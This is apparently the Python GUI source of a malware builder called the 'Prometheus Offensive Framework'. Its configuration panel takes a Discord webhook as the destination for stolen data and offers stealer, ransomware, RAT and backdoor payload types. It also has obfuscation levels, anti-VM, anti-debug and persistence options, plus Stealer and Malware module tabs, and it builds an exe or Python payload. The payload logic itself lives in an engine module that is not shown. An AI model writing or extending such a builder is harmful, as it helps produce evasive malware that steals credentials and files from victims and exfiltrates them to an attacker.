import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import os
import sys
import threading
import logging
from pathlib import Path

from core.engine import Engine


class PrometheusApp(ctk.CTk):
    """Production-ready GUI for the Prometheus Offensive Framework."""

    def __init__(self, engine: Engine):
        super().__init__()

        self.engine = engine
        self.logger = logging.getLogger(__name__)

        # Window setup
        self.title(f"Prometheus Offensive Framework v{engine.config.get('version', '1.0.0')}")
        self.geometry("1000x700")
        self.minsize(800, 600)
        self.configure(fg_color="#1a1a1a")

        # Set icon
        icon_path = Path(__file__).parent.parent / "assets" / "prometheus.ico"
        if icon_path.exists():
            try:
                self.iconbitmap(str(icon_path))
            except:
                pass

        # Build UI
        self._build_ui()

        # Bind close event
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _build_ui(self):
        """Build the complete user interface."""
        # Main container
        main_frame = ctk.CTkFrame(self, fg_color="transparent")
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)

        # Left panel (configuration)
        left_panel = self._build_left_panel(main_frame)
        left_panel.pack(side="left", fill="both", expand=True, padx=(0, 5))

        # Right panel (modules)
        right_panel = self._build_right_panel(main_frame)
        right_panel.pack(side="right", fill="both", expand=True, padx=(5, 0))

    def _build_left_panel(self, parent):
        """Build the left configuration panel."""
        panel = ctk.CTkFrame(parent, fg_color="#2b2b2b", corner_radius=10)
        panel.pack_propagate(False)
        panel.configure(width=400)

        # Title
        ctk.CTkLabel(
            panel,
            text="⚙️ Configuration",
            font=ctk.CTkFont(size=20, weight="bold"),
            text_color="#ffffff"
        ).pack(pady=(15, 10), padx=15, anchor="w")

        # Separator
        self._add_separator(panel)

        # Webhook section
        self._build_webhook_section(panel)

        # File settings
        self._build_file_settings(panel)

        # Payload settings
        self._build_payload_settings(panel)

        # Build button
        self._build_button(panel)

        # Status bar
        self.status_label = ctk.CTkLabel(
            panel,
            text="Ready",
            text_color="#666666",
            font=ctk.CTkFont(size=12)
        )
        self.status_label.pack(pady=(5, 10))

        # Progress bar
        self.progress_bar = ctk.CTkProgressBar(
            panel,
            height=8,
            fg_color="#3b3b3b",
            progress_color="#a80505",
        )
        self.progress_bar.pack(padx=15, pady=(0, 10), fill="x")
        self.progress_bar.set(0)

        return panel

    def _build_webhook_section(self, parent):
        """Build the webhook configuration section."""
        frame = ctk.CTkFrame(parent, fg_color="transparent")
        frame.pack(fill="x", padx=15, pady=5)

        ctk.CTkLabel(
            frame,
            text="Discord Webhook",
            font=ctk.CTkFont(size=13, weight="bold"),
            text_color="#ffffff"
        ).pack(anchor="w")

        self.webhook_entry = ctk.CTkEntry(
            frame,
            height=35,
            placeholder_text="https://discord.com/api/webhooks/...",
            fg_color="#3b3b3b",
            border_color="#a80505",
            border_width=1,
            text_color="#ffffff"
        )
        self.webhook_entry.pack(fill="x", pady=(5, 5))
        self.webhook_entry.insert(0, self.engine.get_webhook())

        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", pady=(0, 5))

        ctk.CTkButton(
            btn_frame,
            text="Test Webhook",
            height=28,
            width=120,
            fg_color="#3b3b3b",
            hover_color="#555555",
            command=self._test_webhook,
            font=ctk.CTkFont(size=11)
        ).pack(side="left", padx=(0, 5))

        ctk.CTkButton(
            btn_frame,
            text="Encrypt & Save",
            height=28,
            width=120,
            fg_color="#555555",
            hover_color="#777777",
            command=self._save_webhook,
            font=ctk.CTkFont(size=11)
        ).pack(side="left")

    def _build_file_settings(self, parent):
        """Build the file settings section."""
        frame = ctk.CTkFrame(parent, fg_color="transparent")
        frame.pack(fill="x", padx=15, pady=5)

        ctk.CTkLabel(
            frame,
            text="File Settings",
            font=ctk.CTkFont(size=13, weight="bold"),
            text_color="#ffffff"
        ).pack(anchor="w", pady=(10, 5))

        # File name
        self.name_entry = ctk.CTkEntry(
            frame,
            height=32,
            placeholder_text="payload",
            fg_color="#3b3b3b",
            border_color="#a80505",
            border_width=1,
            text_color="#ffffff"
        )
        self.name_entry.pack(fill="x", pady=2)
        self.name_entry.insert(0, self.engine.config.get("file_name", "payload"))

        # Output type
        type_frame = ctk.CTkFrame(frame, fg_color="transparent")
        type_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(
            type_frame,
            text="Type:",
            font=ctk.CTkFont(size=12),
            text_color="#949494"
        ).pack(side="left", padx=(0, 10))

        self.type_var = ctk.StringVar(value="exe")
        type_menu = ctk.CTkOptionMenu(
            type_frame,
            values=["exe", "python"],
            variable=self.type_var,
            fg_color="#3b3b3b",
            button_color="#a80505",
            button_hover_color="#6b0404",
            height=28,
            width=120,
            font=ctk.CTkFont(size=12)
        )
        type_menu.pack(side="left")

        # Icon selection
        icon_frame = ctk.CTkFrame(frame, fg_color="transparent")
        icon_frame.pack(fill="x", pady=5)

        ctk.CTkButton(
            icon_frame,
            text="Select Icon (.ico)",
            height=28,
            width=120,
            fg_color="#3b3b3b",
            hover_color="#555555",
            command=self._choose_icon,
            font=ctk.CTkFont(size=11)
        ).pack(side="left")

        self.icon_label = ctk.CTkLabel(
            icon_frame,
            text="No icon selected",
            text_color="#666666",
            font=ctk.CTkFont(size=11)
        )
        self.icon_label.pack(side="left", padx=(10, 0))

    def _build_payload_settings(self, parent):
        """Build the payload settings section."""
        frame = ctk.CTkFrame(parent, fg_color="transparent")
        frame.pack(fill="x", padx=15, pady=5)

        ctk.CTkLabel(
            frame,
            text="Payload Settings",
            font=ctk.CTkFont(size=13, weight="bold"),
            text_color="#ffffff"
        ).pack(anchor="w", pady=(10, 5))

        # Payload type
        type_frame = ctk.CTkFrame(frame, fg_color="transparent")
        type_frame.pack(fill="x", pady=2)

        ctk.CTkLabel(
            type_frame,
            text="Type:",
            font=ctk.CTkFont(size=12),
            text_color="#949494"
        ).pack(side="left", padx=(0, 10))

        self.payload_type_var = ctk.StringVar(value="full")
        payload_menu = ctk.CTkOptionMenu(
            type_frame,
            values=["full", "stealer", "ransomware", "rat", "backdoor"],
            variable=self.payload_type_var,
            fg_color="#3b3b3b",
            button_color="#a80505",
            button_hover_color="#6b0404",
            height=28,
            width=140,
            font=ctk.CTkFont(size=12)
        )
        payload_menu.pack(side="left")

        # Obfuscation level
        obfuscate_frame = ctk.CTkFrame(frame, fg_color="transparent")
        obfuscate_frame.pack(fill="x", pady=2)

        ctk.CTkLabel(
            obfuscate_frame,
            text="Obfuscation:",
            font=ctk.CTkFont(size=12),
            text_color="#949494"
        ).pack(side="left", padx=(0, 10))

        self.obfuscate_var = ctk.StringVar(value="medium")
        obfuscate_menu = ctk.CTkOptionMenu(
            obfuscate_frame,
            values=["none", "low", "medium", "high"],
            variable=self.obfuscate_var,
            fg_color="#3b3b3b",
            button_color="#a80505",
            button_hover_color="#6b0404",
            height=28,
            width=100,
            font=ctk.CTkFont(size=12)
        )
        obfuscate_menu.pack(side="left")

        # Checkboxes
        options_frame = ctk.CTkFrame(frame, fg_color="transparent")
        options_frame.pack(fill="x", pady=5)

        self.anti_vm_var = ctk.StringVar(value="Enable" if self.engine.config.get("anti_vm", True) else "Disable")
        ctk.CTkCheckBox(
            options_frame,
            text="Anti-VM",
            variable=self.anti_vm_var,
            onvalue="Enable",
            offvalue="Disable",
            fg_color="#a80505",
            border_color="#a80505",
            font=ctk.CTkFont(size=12),
            text_color="#ffffff"
        ).pack(side="left", padx=(0, 15))

        self.anti_debug_var = ctk.StringVar(value="Enable" if self.engine.config.get("anti_debug", True) else "Disable")
        ctk.CTkCheckBox(
            options_frame,
            text="Anti-Debug",
            variable=self.anti_debug_var,
            onvalue="Enable",
            offvalue="Disable",
            fg_color="#a80505",
            border_color="#a80505",
            font=ctk.CTkFont(size=12),
            text_color="#ffffff"
        ).pack(side="left", padx=(0, 15))

        self.persistence_var = ctk.StringVar(value="Enable" if self.engine.config.get("persistence", False) else "Disable")
        ctk.CTkCheckBox(
            options_frame,
            text="Persistence",
            variable=self.persistence_var,
            onvalue="Enable",
            offvalue="Disable",
            fg_color="#a80505",
            border_color="#a80505",
            font=ctk.CTkFont(size=12),
            text_color="#ffffff"
        ).pack(side="left")

    def _build_button(self, parent):
        """Build the build button."""
        self.build_button = ctk.CTkButton(
            parent,
            text="⚡ Build Payload",
            height=50,
            font=ctk.CTkFont(size=18, weight="bold"),
            fg_color="#a80505",
            hover_color="#6b0404",
            corner_radius=8,
            command=self._start_build
        )
        self.build_button.pack(pady=(15, 5), padx=30, fill="x")

    def _add_separator(self, parent):
        """Add a separator line."""
        ctk.CTkFrame(parent, height=1, fg_color="#3b3b3b").pack(fill="x", padx=15, pady=5)

    def _test_webhook(self):
        """Test the webhook URL."""
        webhook = self.webhook_entry.get().strip()
        if not webhook:
            messagebox.showerror("Error", "Please enter a webhook URL.")
            return

        def test():
            try:
                import requests
                data = {
                    "content": "🔔 **Webhook Test from Prometheus**",
                    "embeds": [{
                        "title": "✅ Webhook Valid",
                        "description": "This is a test message from the Prometheus framework.",
                        "color": 0x00ff00,
                        "footer": {"text": "Prometheus Offensive Framework"}
                    }]
                }
                response = requests.post(webhook, json=data, timeout=10)
                if response.status_code in (200, 204):
                    self.after(0, lambda: messagebox.showinfo("Success", "Webhook is valid. Test message sent!"))
                else:
                    self.after(0, lambda: messagebox.showerror("Error", f"Webhook test failed. Status: {response.status_code}"))
            except Exception as e:
                self.after(0, lambda: messagebox.showerror("Error", f"Webhook test failed: {e}"))

        threading.Thread(target=test, daemon=True).start()

    def _save_webhook(self):
        """Save the webhook URL in encrypted form."""
        webhook = self.webhook_entry.get().strip()
        if webhook:
            self.engine.set_webhook(webhook)
            self.status_label.configure(text="Webhook saved securely.")
        else:
            messagebox.showerror("Error", "Please enter a webhook URL.")

    def _choose_icon(self):
        """Open a file dialog to select an icon."""
        icon_path = filedialog.askopenfilename(
            title="Select Icon",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        if icon_path:
            self.engine.config["icon_path"] = icon_path
            self.icon_label.configure(text=os.path.basename(icon_path))

    def _build_right_panel(self, parent):
        """Build the right module management panel."""
        panel = ctk.CTkFrame(parent, fg_color="#2b2b2b", corner_radius=10)
        panel.pack_propagate(False)
        panel.configure(width=450)

        # Title
        ctk.CTkLabel(
            panel,
            text="🧩 Modules",
            font=ctk.CTkFont(size=20, weight="bold"),
            text_color="#ffffff"
        ).pack(pady=(15, 10), padx=15, anchor="w")

        # Tab view for module categories
        tab_view = ctk.CTkTabview(
            panel,
            fg_color="#3b3b3b",
            segmented_button_fg_color="#1a1a1a",
            segmented_button_selected_color="#a80505",
            segmented_button_selected_hover_color="#6b0404"
        )
        tab_view.pack(fill="both", expand=True, padx=10, pady=5)

        # Stealer tab
        stealer_tab = tab_view.add("Stealer")
        self._populate_module_tab(stealer_tab, "stealer")

        # Malware tab
        malware_tab = tab_view.add("Malware")
        self._populate_module_tab(malware_tab, "malware")

        # Utility tab
        utility_tab = tab_view.add("Utility")
        self._populate_module_tab(utility_tab, "utility")

        return panel

    def _populate_module_tab(self, parent, category):
        """Populate a module tab with checkboxes."""
        frame = ctk.CTkScrollableFrame(parent, fg_color="transparent")
        frame.pack(fill="both", expand=True, padx=5, pady=5)

        modules = self.engine.get_available_modules()
        module_vars = {}

        for module_id, module_info in modules.items():
            if module_info.get("category") != category:
                continue

            var = ctk.StringVar(value="Enable" if module_info.get("enabled", False) else "Disable")
            module_vars[module_id] = var

            # Module row
            row_frame = ctk.CTkFrame(frame, fg_color="transparent")
            row_frame.pack(fill="x", pady=2)

            cb = ctk.CTkCheckBox(
                row_frame,
                text=module_info.get("name", module_id),
                variable=var,
                onvalue="Enable",
                offvalue="Disable",
                fg_color="#a80505",
                border_color="#a80505",
                font=ctk.CTkFont(size=13),
                text_color="#ffffff",
                command=lambda mid=module_id, v=var: self._toggle_module(mid, v)
            )
            cb.pack(side="left")

            # Config button if module has config
            if module_info.get("has_config", False):
                ctk.CTkButton(
                    row_frame,
                    text="⚙️",
                    width=30,
                    height=24,
                    fg_color="#3b3b3b",
                    hover_color="#555555",
                    font=ctk.CTkFont(size=12),
                    command=lambda mid=module_id: self._open_module_config(mid)
                ).pack(side="right")

            # Separator
            ctk.CTkFrame(frame, height=1, fg_color="#3b3b3b").pack(fill="x", pady=1)

    def _toggle_module(self, module_id, var):
        """Toggle a module on/off."""
        enabled = var.get() == "Enable"
        self.engine.enable_module(module_id, enabled)

    def _open_module_config(self, module_id):
        """Open configuration dialog for a module."""
        # This would open a module-specific config dialog
        # For P.O.C., just show a placeholder
        messagebox.showinfo("Module Config", f"Configuration for {module_id} would open here.")

    def _start_build(self):
        """Start the build process."""
        # Gather configuration
        webhook = self.webhook_entry.get().strip()
        if not webhook:
            messagebox.showerror("Error", "Please enter a webhook URL.")
            return

        file_name = self.name_entry.get().strip() or "payload"
        payload_type = self.payload_type_var.get()
        obfuscation = self.obfuscate_var.get()
        file_type = self.type_var.get()

        # Update engine config
        self.engine.set_webhook(webhook)
        self.engine.config["file_name"] = file_name
        self.engine.config["payload_type"] = payload_type
        self.engine.config["obfuscation_level"] = obfuscation
        self.engine.config["output_path"] = f"output/{file_name}.{'exe' if file_type == 'exe' else 'py'}"
        self.engine.config["anti_vm"] = self.anti_vm_var.get() == "Enable"
        self.engine.config["anti_debug"] = self.anti_debug_var.get() == "Enable"
        self.engine.config["persistence"] = self.persistence_var.get() == "Enable"

        # Disable build button
        self.build_button.configure(state="disabled", text="Building...")

        def build_thread():
            def update_progress(message, progress):
                self.after(0, lambda: self._update_progress(message, progress))

            # Override progress reporting
            success = self.engine.build()
            self.after(0, lambda: self._build_finished(success))

        threading.Thread(target=build_thread, daemon=True).start()

    def _update_progress(self, message: str, progress: int):
        """Update the progress bar."""
        self.progress_bar.set(progress / 100.0)
        self.status_label.configure(text=message)

    def _build_finished(self, success: bool):
        """Handle build completion."""
        self.build_button.configure(state="normal", text="⚡ Build Payload")
        if success:
            self.status_label.configure(text="✅ Build successful!")
            self.progress_bar.set(1.0)
            output_path = self.engine.config["output_path"]
            if messagebox.askyesno("Success", f"Build completed!\n\nOutput: {output_path}\n\nOpen output folder?"):
                output_dir = os.path.dirname(output_path)
                if os.path.exists(output_dir):
                    if sys.platform == "win32":
                        os.startfile(output_dir)
                    else:
                        os.system(f'open "{output_dir}"' if sys.platform == "darwin" else f'xdg-open "{output_dir}"')
        else:
            self.status_label.configure(text="❌ Build failed. Check logs for details.")
            self.progress_bar.set(0)
            messagebox.showerror("Error", "Build failed. Check the console for error details.")

    def _on_close(self):
        """Handle window close event."""
        if messagebox.askokcancel("Quit", "Are you sure you want to exit?"):
            # Save configuration before closing
            self.engine.save_config()
            self.destroy()

    def run(self):
        """Start the application."""
        self.mainloop()
